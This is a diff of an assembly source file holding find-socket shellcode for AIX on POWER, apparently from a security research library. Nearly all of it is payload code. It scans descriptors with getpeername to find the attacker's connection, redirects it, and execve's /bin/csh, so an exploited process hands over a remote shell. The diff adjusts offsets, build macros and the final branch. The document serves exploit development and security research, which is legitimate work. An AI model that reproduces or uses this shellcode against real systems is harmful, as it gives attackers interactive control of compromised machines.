@@ -1,7 +1,7 @@
 /*
- *  $Id: aix-power-fndsockcode.S 6 2008-09-10 17:27:50Z ramon $
+ *  $Id: aix-power-fndsockcode.S 40 2008-11-17 02:45:30Z ramon $
  *
- *  aix-power-fndsockcode.S - AIX POWER/PowerPC Find socket code
+ *  aix-power-fndsockcode.S - AIX Power Find socket code
  *  Copyright 2008 Ramon de Carvalho Valle <ramon@risesecurity.org>
  *
  *  This library is free software; you can redistribute it and/or
@@ -22,14 +22,14 @@
 
 /*
  * Compile with the following command.
- * $ gcc -Wall -DVERSION -o aix-power-fndsockcode aix-power-fndsockcode.S
+ * $ gcc -Wall -DAIXLEVEL -o aix-power-fndsockcode aix-power-fndsockcode.S
  *
- * Where VERSION is one of the currently supported AIX versions.
- * -DV41    AIX 4.1
- * -DV42    AIX 4.2
- * -DV43    AIX 4.3
- * -DV4330  AIX 4.3.3.0
- * -DV53    AIX 5.3
+ * Where AIXLEVEL is one of the currently supported AIX levels.
+ * -DV410   AIX 4.1.0
+ * -DV420   AIX 4.2.0
+ * -DV430   AIX 4.3.0
+ * -DV433   AIX 4.3.3
+ * -DV530   AIX 5.3.0
  *
  */
 
@@ -42,38 +42,30 @@
 
 syscallcode:
     xor.    %r31,%r31,%r31
-    # xor.    %r5,%r5,%r5
     bnel    syscallcode
     mflr    %r30
     cal     %r30,511(%r30)
-    cal     %r30,-483(%r30)
-    # cal     %r30,-475(%r30)
+    cal     %r30,-511+28(%r30)
     mtctr   %r30
     bctr
-    # .long   0xff0204d2
-    # .long   0x7f000001
     crorc   %cr6,%cr6,%cr6
     .long   0x44ffff02
     cal     %r30,-8(%r30)
 
 fndsockcode:
+    lil     %r29,__CAL
 
     # getpeername
 
-    lil     %r29,__CAL
-
     stu     %r31,-4(%r1)
     mr      %r28,%r1
-    cal     %r27,-467(%r29)
+    cal     %r27,-511+44(%r29)
     stu     %r27,-4(%r1)
     mr      %r27,%r1
-
-    # lil     %r31,32767
 
 0:
     cal     %r31,511(%r31)
     cal     %r31,-511+1(%r31)
-    # cal     %r31,-1(%r31)
 
     mr      %r5,%r27
     mr      %r4,%r28
@@ -90,7 +82,7 @@ fndsockcode:
 
     # close
 
-    cal     %r25,-509(%r29)
+    cal     %r25,-511+2(%r29)
 
 1:
     mr      %r3,%r25
@@ -112,24 +104,24 @@ fndsockcode:
 
 shellcode:
     # lil     %r31,__CAL
-
     xor.    %r5,%r5,%r5
     bnel    shellcode
-
     # mflr    %r30
     # cal     %r30,511(%r30)
-    # cal     %r3,-475(%r30)
+    # cal     %r3,-511+40(%r30)
+    # stb     %r5,-511+48(%r30)
     mflr    %r24
     cal     %r24,511(%r24)
-    cal     %r3,-475(%r24)
-
+    cal     %r3,-511+40(%r24)
+    stb     %r5,-511+48(%r24)
     stu     %r5,-4(%r1)
     stu     %r3,-4(%r1)
     mr      %r4,%r1
-
     # cal     %r2,__NC_execve(%r31)
     cal     %r2,__NC_execve(%r29)
-
+    # crorc   %cr6,%cr6,%cr6
+    # .long   0x44ffff02
     mtctr   %r30
-    bctr
+    bctrl
     .asciz  "/bin/csh"
+
